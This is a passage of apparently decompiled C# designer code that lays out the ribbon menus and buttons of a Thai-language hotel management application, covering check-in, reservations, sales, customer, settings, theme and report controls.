		this.RibbonBar1.TitleStyleMouseOver.Class = "";
		this.RibbonBar1.TitleVisible = false;
		this.B1.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B1.Image = (System.Drawing.Image)resources.GetObject("B1.Image");
		this.B1.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B1.Name = "B1";
		this.B1.Text = "รายการห\u0e49องพ\u0e31ก";
		this.B2.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B2.Image = (System.Drawing.Image)resources.GetObject("B2.Image");
		this.B2.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B2.Name = "B2";
		this.B2.Text = "Check-In";
		this.B3.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B3.Image = (System.Drawing.Image)resources.GetObject("B3.Image");
		this.B3.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B3.Name = "B3";
		this.B3.Text = "Check-Out";
		this.B4.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B4.Image = (System.Drawing.Image)resources.GetObject("B4.Image");
		this.B4.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B4.Name = "B4";
		this.B4.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[4] { this.ButtonItem10, this.ButtonItem_0, this.ButtonItem9, this.ButtonItem34 });
		this.B4.Text = "จองห\u0e49องพ\u0e31ก";
		this.ButtonItem10.Image = (System.Drawing.Image)resources.GetObject("ButtonItem10.Image");
		this.ButtonItem10.Name = "ButtonItem10";
		this.ButtonItem10.Text = "จองแบบไม\u0e48ระบ\u0e38ห\u0e49อง";
		this.ButtonItem_0.Image = (System.Drawing.Image)resources.GetObject("จองแบบระบ\u0e38ห\u0e49อง.Image");
		this.ButtonItem_0.Name = "จองแบบระบ\u0e38ห\u0e49อง";
		this.ButtonItem_0.Text = "จองแบบระบ\u0e38ห\u0e49อง";
		this.ButtonItem9.Image = (System.Drawing.Image)resources.GetObject("ButtonItem9.Image");
		this.ButtonItem9.Name = "ButtonItem9";
		this.ButtonItem9.Text = "ค\u0e49นหารายการจองห\u0e49องพ\u0e31กท\u0e31\u0e49งหมด";
		this.ButtonItem34.Image = (System.Drawing.Image)resources.GetObject("ButtonItem34.Image");
		this.ButtonItem34.Name = "ButtonItem34";
		this.ButtonItem34.Text = "แผนผ\u0e31งตารางการจอง";
		this.B5.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B5.Image = (System.Drawing.Image)resources.GetObject("B5.Image");
		this.B5.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B5.Name = "B5";
		this.B5.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem13, this.ButtonItem21 });
		this.B5.Text = "ขายส\u0e34นค\u0e49า";
		this.ButtonItem13.Image = iHOTEL2025.My.Resources.Resources._11__5_;
		this.ButtonItem13.Name = "ButtonItem13";
		this.ButtonItem13.Text = "เพ\u0e34\u0e48มรายการขาย";
		this.ButtonItem21.Image = iHOTEL2025.My.Resources.Resources.page_white_star;
		this.ButtonItem21.Name = "ButtonItem21";
		this.ButtonItem21.Text = "ด\u0e39รายการขายส\u0e34นค\u0e49า";
		this.ButtonItem6.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem6.Image = (System.Drawing.Image)resources.GetObject("ButtonItem6.Image");
		this.ButtonItem6.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem6.Name = "ButtonItem6";
		this.ButtonItem6.Text = "ค\u0e39ปองอาหาร";
		this.ButtonItem6.Tooltip = "ค\u0e39ปองอาหาร";
		this.B6.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B6.Image = (System.Drawing.Image)resources.GetObject("B6.Image");
		this.B6.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B6.Name = "B6";
		this.B6.Text = "ใบลงทะเบ\u0e35ยน";
		this.B12.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B12.Image = (System.Drawing.Image)resources.GetObject("B12.Image");
		this.B12.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B12.Name = "B12";
		this.B12.Text = "จ\u0e31ดการรอบบ\u0e34ล";
		this.B12.Tooltip = "จ\u0e31ดการรอบบ\u0e34ล";
		this.RibbonPanel2.AntiAlias = false;
		this.RibbonPanel2.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel2.Controls.Add(this.RibbonBar_1);
		this.RibbonPanel2.Controls.Add(this.RibbonBar_0);
		this.RibbonPanel2.Controls.Add(this.RibbonBar9);
		this.RibbonPanel2.Controls.Add(this.RibbonBar8);
		this.RibbonPanel2.Controls.Add(this.RibbonBar3);
		this.RibbonPanel2.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel4 = this.RibbonPanel2;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel4.Location = location;
		this.RibbonPanel2.Name = "RibbonPanel2";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel5 = this.RibbonPanel2;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel5.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel6 = this.RibbonPanel2;
		size = new System.Drawing.Size(1444, 69);
		ribbonPanel6.Size = size;
		this.RibbonPanel2.Style.Class = "";
		this.RibbonPanel2.StyleMouseDown.Class = "";
		this.RibbonPanel2.StyleMouseOver.Class = "";
		this.RibbonPanel2.TabIndex = 4;
		this.RibbonPanel2.Visible = false;
		this.RibbonBar_1.AutoOverflowEnabled = true;
		this.RibbonBar_1.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_1.BackgroundStyle.Class = "";
		this.RibbonBar_1.ContainerControlProcessDialogKey = true;
		this.RibbonBar_1.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_1.Items.AddRange(new DevComponents.DotNetBar.BaseItem[4] { this.B23, this.ButtonItem52, this.ButtonItem38, this.ButtonItem71 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_ = this.RibbonBar_1;
		location = new System.Drawing.Point(999, 0);
		ribbonBar_.Location = location;
		this.RibbonBar_1.Name = "RibbonBar11";
		DevComponents.DotNetBar.RibbonBar ribbonBar_2 = this.RibbonBar_1;
		size = new System.Drawing.Size(287, 66);
		ribbonBar_2.Size = size;
		this.RibbonBar_1.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_1.TabIndex = 13;
		this.RibbonBar_1.Text = "ต\u0e31\u0e49งค\u0e48า";
		this.RibbonBar_1.TitleStyle.Class = "";
		this.RibbonBar_1.TitleStyleMouseOver.Class = "";
		this.B23.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B23.Image = (System.Drawing.Image)resources.GetObject("B23.Image");
		this.B23.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B23.Name = "B23";
		this.B23.Text = "ต\u0e31\u0e49งค\u0e48าโปรแกรม";
		this.ButtonItem52.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem52.Image = (System.Drawing.Image)resources.GetObject("ButtonItem52.Image");
		this.ButtonItem52.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem52.Name = "ButtonItem52";
		this.ButtonItem52.Text = "ต\u0e31\u0e49งค\u0e48าSMS";
		this.ButtonItem38.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem38.Image = (System.Drawing.Image)resources.GetObject("ButtonItem38.Image");
		this.ButtonItem38.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem38.Name = "ButtonItem38";
		this.ButtonItem38.Text = "ลบข\u0e49อม\u0e39ลท\u0e31\u0e49งหมด";
		this.ButtonItem38.Visible = false;
		this.ButtonItem71.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem71.Image = (System.Drawing.Image)resources.GetObject("ButtonItem71.Image");
		this.ButtonItem71.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem71.Name = "ButtonItem71";
		this.ButtonItem71.Text = "DDNS";
		this.RibbonBar_0.AutoOverflowEnabled = true;
		this.RibbonBar_0.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_0.BackgroundStyle.Class = "";
		this.RibbonBar_0.ContainerControlProcessDialogKey = true;
		this.RibbonBar_0.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_0.Items.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.B21, this.B22 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_3 = this.RibbonBar_0;
		location = new System.Drawing.Point(837, 0);
		ribbonBar_3.Location = location;
		this.RibbonBar_0.Name = "RibbonBar10";
		DevComponents.DotNetBar.RibbonBar ribbonBar_4 = this.RibbonBar_0;
		size = new System.Drawing.Size(162, 66);
		ribbonBar_4.Size = size;
		this.RibbonBar_0.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_0.TabIndex = 12;
		this.RibbonBar_0.Text = "ส\u0e34นค\u0e49า";
		this.RibbonBar_0.TitleStyle.Class = "";
		this.RibbonBar_0.TitleStyleMouseOver.Class = "";
		this.B21.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B21.Image = (System.Drawing.Image)resources.GetObject("B21.Image");
		this.B21.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B21.Name = "B21";
		this.B21.Text = "ประเภทส\u0e34นค\u0e49า";
		this.B21.Tooltip = "จ\u0e31ดการประเภทส\u0e34นค\u0e49า";
		this.B22.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B22.Image = (System.Drawing.Image)resources.GetObject("B22.Image");
		this.B22.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B22.Name = "B22";
		this.B22.Text = "ทะเบ\u0e35ยนส\u0e34นค\u0e49า";
		this.B22.Tooltip = "จ\u0e31ดการส\u0e34นค\u0e49า";
		this.RibbonBar9.AutoOverflowEnabled = true;
		this.RibbonBar9.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar9.BackgroundStyle.Class = "";
		this.RibbonBar9.ContainerControlProcessDialogKey = true;
		this.RibbonBar9.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar9.Items.AddRange(new DevComponents.DotNetBar.BaseItem[7] { this.B16, this.B17, this.B18, this.B19, this.B20, this.ButtonItem60, this.ButtonItem68 });
		DevComponents.DotNetBar.RibbonBar ribbonBar9 = this.RibbonBar9;
		location = new System.Drawing.Point(347, 0);
		ribbonBar9.Location = location;
		this.RibbonBar9.Name = "RibbonBar9";
		DevComponents.DotNetBar.RibbonBar ribbonBar10 = this.RibbonBar9;
		size = new System.Drawing.Size(490, 66);
		ribbonBar10.Size = size;
		this.RibbonBar9.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar9.TabIndex = 11;
		this.RibbonBar9.Text = "ล\u0e39กค\u0e49า";
		this.RibbonBar9.TitleStyle.Class = "";
		this.RibbonBar9.TitleStyleMouseOver.Class = "";
		this.B16.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B16.Image = (System.Drawing.Image)resources.GetObject("B16.Image");
		this.B16.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B16.Name = "B16";
		this.B16.Text = "ล\u0e39กค\u0e49า";
		this.B17.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B17.Image = (System.Drawing.Image)resources.GetObject("B17.Image");
		this.B17.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B17.Name = "B17";
		this.B17.Text = "ประเภทล\u0e39กค\u0e49า";
		this.B18.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B18.Image = (System.Drawing.Image)resources.GetObject("B18.Image");
		this.B18.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B18.Name = "B18";
		this.B18.Text = "กล\u0e38\u0e48มราคา/ม\u0e31ดจำ";
		this.B19.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B19.Image = (System.Drawing.Image)resources.GetObject("B19.Image");
		this.B19.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B19.Name = "B19";
		this.B19.Text = "ต\u0e31\u0e49งค\u0e48าปร\u0e31บราคาลง";
		this.B20.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B20.Image = (System.Drawing.Image)resources.GetObject("B20.Image");
		this.B20.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B20.Name = "B20";
		this.B20.Text = "ต\u0e31\u0e49งค\u0e48าปร\u0e31บราคาข\u0e36\u0e49น";
		this.ButtonItem60.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem60.Image = (System.Drawing.Image)resources.GetObject("ButtonItem60.Image");
		this.ButtonItem60.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem60.Name = "ButtonItem60";
		this.ButtonItem60.Text = "เซลล\u0e4c";
		this.ButtonItem68.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem68.Image = (System.Drawing.Image)resources.GetObject("ButtonItem68.Image");
		this.ButtonItem68.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem68.Name = "ButtonItem68";
		this.ButtonItem68.Text = "สาขา";
		this.RibbonBar8.AutoOverflowEnabled = true;
		this.RibbonBar8.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar8.BackgroundStyle.Class = "";
		this.RibbonBar8.ContainerControlProcessDialogKey = true;
		this.RibbonBar8.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar8.Items.AddRange(new DevComponents.DotNetBar.BaseItem[3] { this.B14, this.B15, this.ButtonItem46 });
		DevComponents.DotNetBar.RibbonBar ribbonBar11 = this.RibbonBar8;
		location = new System.Drawing.Point(65, 0);
		ribbonBar11.Location = location;
		this.RibbonBar8.Name = "RibbonBar8";
		DevComponents.DotNetBar.RibbonBar ribbonBar12 = this.RibbonBar8;
		size = new System.Drawing.Size(282, 66);
		ribbonBar12.Size = size;
		this.RibbonBar8.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar8.TabIndex = 10;
		this.RibbonBar8.Text = "ห\u0e49องพ\u0e31ก";
		this.RibbonBar8.TitleStyle.Class = "";
		this.RibbonBar8.TitleStyleMouseOver.Class = "";
		this.B14.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B14.Image = (System.Drawing.Image)resources.GetObject("B14.Image");
		this.B14.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B14.Name = "B14";
		this.B14.Text = "ประเภทห\u0e49องพ\u0e31ก/ราคา";
		this.B15.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B15.Image = (System.Drawing.Image)resources.GetObject("B15.Image");
		this.B15.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B15.Name = "B15";
		this.B15.Text = "จ\u0e31ดการห\u0e49องพ\u0e31ก";
		this.ButtonItem46.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem46.Image = (System.Drawing.Image)resources.GetObject("ButtonItem46.Image");
		this.ButtonItem46.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem46.Name = "ButtonItem46";
		this.ButtonItem46.Text = "จ\u0e31ดการต\u0e48อเวลา";
		this.RibbonBar3.AutoOverflowEnabled = true;
		this.RibbonBar3.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar3.BackgroundStyle.Class = "";
		this.RibbonBar3.ContainerControlProcessDialogKey = true;
		this.RibbonBar3.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar3.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.B13 });
		DevComponents.DotNetBar.RibbonBar ribbonBar13 = this.RibbonBar3;
		location = new System.Drawing.Point(3, 0);
		ribbonBar13.Location = location;
		this.RibbonBar3.Name = "RibbonBar3";
		DevComponents.DotNetBar.RibbonBar ribbonBar14 = this.RibbonBar3;
		size = new System.Drawing.Size(62, 66);
		ribbonBar14.Size = size;
		this.RibbonBar3.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar3.TabIndex = 5;
		this.RibbonBar3.Text = "ผ\u0e39\u0e49ใช\u0e49งาน";
		this.RibbonBar3.TitleStyle.Class = "";
		this.RibbonBar3.TitleStyleMouseOver.Class = "";
		this.B13.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B13.Image = (System.Drawing.Image)resources.GetObject("B13.Image");
		this.B13.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B13.Name = "B13";
		this.B13.Text = "ผ\u0e39\u0e49ใช\u0e49งาน";
		this.B13.Tooltip = "ผ\u0e39\u0e49ใช\u0e49งาน";
		this.RibbonPanel6.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel6.Controls.Add(this.ribbonBar7);
		this.RibbonPanel6.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel7 = this.RibbonPanel6;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel7.Location = location;
		this.RibbonPanel6.Name = "RibbonPanel6";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel8 = this.RibbonPanel6;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel8.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel9 = this.RibbonPanel6;
		size = new System.Drawing.Size(1444, 69);
		ribbonPanel9.Size = size;
		this.RibbonPanel6.Style.Class = "";
		this.RibbonPanel6.StyleMouseDown.Class = "";
		this.RibbonPanel6.StyleMouseOver.Class = "";
		this.RibbonPanel6.TabIndex = 7;
		this.RibbonPanel6.Visible = false;
		this.ribbonBar7.AutoOverflowEnabled = true;
		this.ribbonBar7.BackgroundMouseOverStyle.Class = "";
		this.ribbonBar7.BackgroundStyle.Class = "";
		this.ribbonBar7.ContainerControlProcessDialogKey = true;
		this.ribbonBar7.DialogLauncherVisible = true;
		this.ribbonBar7.Dock = System.Windows.Forms.DockStyle.Left;
		this.ribbonBar7.Items.AddRange(new DevComponents.DotNetBar.BaseItem[6] { this.ButtonItem35, this.ButtonItem14, this.ButtonItem44, this.ButtonItem19, this.ButtonItem31, this.ButtonItem33 });
		DevComponents.DotNetBar.RibbonBar ribbonBar15 = this.ribbonBar7;
		location = new System.Drawing.Point(3, 0);
		ribbonBar15.Location = location;
		this.ribbonBar7.Name = "ribbonBar7";
		DevComponents.DotNetBar.RibbonBar ribbonBar16 = this.ribbonBar7;
		size = new System.Drawing.Size(459, 66);
		ribbonBar16.Size = size;
		this.ribbonBar7.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.ribbonBar7.TabIndex = 8;
		this.ribbonBar7.TitleStyle.Class = "";
		this.ribbonBar7.TitleStyleMouseOver.Class = "";
		this.ribbonBar7.TitleVisible = false;
		this.ButtonItem35.Image = (System.Drawing.Image)resources.GetObject("ButtonItem35.Image");
		this.ButtonItem35.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem35.Name = "ButtonItem35";
		this.ButtonItem35.Text = "ส\u0e35ฟ\u0e49า";
		this.ButtonItem35.Tooltip = "ส\u0e35ฟ\u0e49า";
		this.ButtonItem14.Image = (System.Drawing.Image)resources.GetObject("ButtonItem14.Image");
		this.ButtonItem14.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem14.Name = "ButtonItem14";
		this.ButtonItem14.Text = "ส\u0e35เทา";
		this.ButtonItem14.Tooltip = "ส\u0e35เทา";
		this.ButtonItem44.Image = (System.Drawing.Image)resources.GetObject("ButtonItem44.Image");
		this.ButtonItem44.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem44.Name = "ButtonItem44";
		this.ButtonItem44.Text = "ส\u0e35ดำ";
		this.ButtonItem44.Tooltip = "ส\u0e35ดำ";
		this.ButtonItem19.Image = (System.Drawing.Image)resources.GetObject("ButtonItem19.Image");
		this.ButtonItem19.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem19.Name = "ButtonItem19";
		this.ButtonItem19.Text = "VistaGlass";
		this.ButtonItem19.Tooltip = "ส\u0e35ดำ";
		this.ButtonItem31.Image = (System.Drawing.Image)resources.GetObject("ButtonItem31.Image");
		this.ButtonItem31.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem31.Name = "ButtonItem31";
		this.ButtonItem31.Text = "Office2010";
		this.ButtonItem31.Tooltip = "Office2010";
		this.ButtonItem33.Image = (System.Drawing.Image)resources.GetObject("ButtonItem33.Image");
		this.ButtonItem33.ImagePosition = DevComponents.DotNetBar.eImagePosition.Bottom;
		this.ButtonItem33.Name = "ButtonItem33";
		this.ButtonItem33.Text = "Windows7";
		this.ButtonItem33.Tooltip = "Windows7";
		this.RibbonPanel4.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel4.Controls.Add(this.RibbonBar_6);
		this.RibbonPanel4.Controls.Add(this.RibbonBar_5);
		this.RibbonPanel4.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel10 = this.RibbonPanel4;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel10.Location = location;
		this.RibbonPanel4.Name = "RibbonPanel4";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel11 = this.RibbonPanel4;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel11.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel12 = this.RibbonPanel4;
		size = new System.Drawing.Size(1444, 69);
		ribbonPanel12.Size = size;
		this.RibbonPanel4.Style.Class = "";
		this.RibbonPanel4.StyleMouseDown.Class = "";
		this.RibbonPanel4.StyleMouseOver.Class = "";
		this.RibbonPanel4.TabIndex = 10;
		this.RibbonPanel4.Visible = false;
		this.RibbonBar_6.AutoOverflowEnabled = true;
		this.RibbonBar_6.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_6.BackgroundStyle.Class = "";
		this.RibbonBar_6.ContainerControlProcessDialogKey = true;
		this.RibbonBar_6.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_6.Items.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem37, this.ButtonItem70 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_5 = this.RibbonBar_6;
		location = new System.Drawing.Point(103, 0);
		ribbonBar_5.Location = location;
		this.RibbonBar_6.Name = "RibbonBar17";
		DevComponents.DotNetBar.RibbonBar ribbonBar_6 = this.RibbonBar_6;
		size = new System.Drawing.Size(216, 66);
		ribbonBar_6.Size = size;
		this.RibbonBar_6.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_6.TabIndex = 1;
		this.RibbonBar_6.Text = "ผ\u0e39\u0e49ผล\u0e34ต";
		this.RibbonBar_6.TitleStyle.Class = "";
		this.RibbonBar_6.TitleStyleMouseOver.Class = "";
		this.ButtonItem37.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem37.Image = (System.Drawing.Image)resources.GetObject("ButtonItem37.Image");
		this.ButtonItem37.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem37.Name = "ButtonItem37";
		this.ButtonItem37.Text = "เก\u0e35\u0e48ยวก\u0e31บโปรแกรม";
		this.ButtonItem70.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem70.Image = (System.Drawing.Image)resources.GetObject("ButtonItem70.Image");
		this.ButtonItem70.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem70.Name = "ButtonItem70";
		this.ButtonItem70.Text = "การลงทะเบ\u0e35ยน";
		this.RibbonBar_5.AutoOverflowEnabled = true;
		this.RibbonBar_5.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_5.BackgroundStyle.Class = "";
		this.RibbonBar_5.ContainerControlProcessDialogKey = true;
		this.RibbonBar_5.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_5.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.B24 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_7 = this.RibbonBar_5;
		location = new System.Drawing.Point(3, 0);
		ribbonBar_7.Location = location;
		this.RibbonBar_5.Name = "RibbonBar16";
		DevComponents.DotNetBar.RibbonBar ribbonBar_8 = this.RibbonBar_5;
		size = new System.Drawing.Size(100, 66);
		ribbonBar_8.Size = size;
		this.RibbonBar_5.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_5.TabIndex = 0;
		this.RibbonBar_5.Text = "อ\u0e31บเดทโปรแกรม";
		this.RibbonBar_5.TitleStyle.Class = "";
		this.RibbonBar_5.TitleStyleMouseOver.Class = "";
		this.B24.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B24.Image = (System.Drawing.Image)resources.GetObject("B24.Image");
		this.B24.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B24.Name = "B24";
		this.B24.Text = "เร\u0e34\u0e48มการอ\u0e31บเดท";
		this.RibbonPanel5.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonPanel5.Controls.Add(this.RibbonBar_4);
		this.RibbonPanel5.Controls.Add(this.RibbonBar_3);
		this.RibbonPanel5.Controls.Add(this.RibbonBar_2);
		this.RibbonPanel5.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel13 = this.RibbonPanel5;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel13.Location = location;
		this.RibbonPanel5.Name = "RibbonPanel5";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel14 = this.RibbonPanel5;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel14.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel15 = this.RibbonPanel5;
		size = new System.Drawing.Size(1215, 69);
		ribbonPanel15.Size = size;
		this.RibbonPanel5.Style.Class = "";
		this.RibbonPanel5.StyleMouseDown.Class = "";
		this.RibbonPanel5.StyleMouseOver.Class = "";
		this.RibbonPanel5.TabIndex = 9;
		this.RibbonPanel5.Visible = false;
		this.RibbonBar_4.AutoOverflowEnabled = true;
		this.RibbonBar_4.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_4.BackgroundStyle.Class = "";
		this.RibbonBar_4.ContainerControlProcessDialogKey = true;
		this.RibbonBar_4.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_4.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.ItemContainer5 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_9 = this.RibbonBar_4;
		location = new System.Drawing.Point(862, 0);
		ribbonBar_9.Location = location;
		this.RibbonBar_4.Name = "RibbonBar14";
		DevComponents.DotNetBar.RibbonBar ribbonBar_10 = this.RibbonBar_4;
		size = new System.Drawing.Size(148, 66);
		ribbonBar_10.Size = size;
		this.RibbonBar_4.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar_4.TabIndex = 2;
		this.RibbonBar_4.Text = "รายงานรอบบ\u0e34ล";
		this.RibbonBar_4.TitleStyle.Class = "";
		this.RibbonBar_4.TitleStyleMouseOver.Class = "";
		this.ItemContainer5.BackgroundStyle.Class = "";
		this.ItemContainer5.LayoutOrientation = DevComponents.DotNetBar.eOrientation.Vertical;
		this.ItemContainer5.Name = "ItemContainer5";
		this.ItemContainer5.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.R19, this.R20 });
		this.R19.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R19.Image = (System.Drawing.Image)resources.GetObject("R19.Image");
		this.R19.Name = "R19";
		this.R19.Text = "รายงานการขายห\u0e49อง";
		this.R20.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.R20.Image = (System.Drawing.Image)resources.GetObject("R20.Image");
		this.R20.Name = "R20";
		this.R20.Text = "รายงานป\u0e34ดรอบ/เง\u0e34นสดคงเหล\u0e37อ";
		this.RibbonBar_3.AutoOverflowEnabled = true;
		this.RibbonBar_3.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar_3.BackgroundStyle.Class = "";
		this.RibbonBar_3.ContainerControlProcessDialogKey = true;
		this.RibbonBar_3.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar_3.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.ItemContainer4 });
		DevComponents.DotNetBar.RibbonBar ribbonBar_11 = this.RibbonBar_3;
		location = new System.Drawing.Point(714, 0);
		ribbonBar_11.Location = location;
		this.RibbonBar_3.Name = "RibbonBar13";
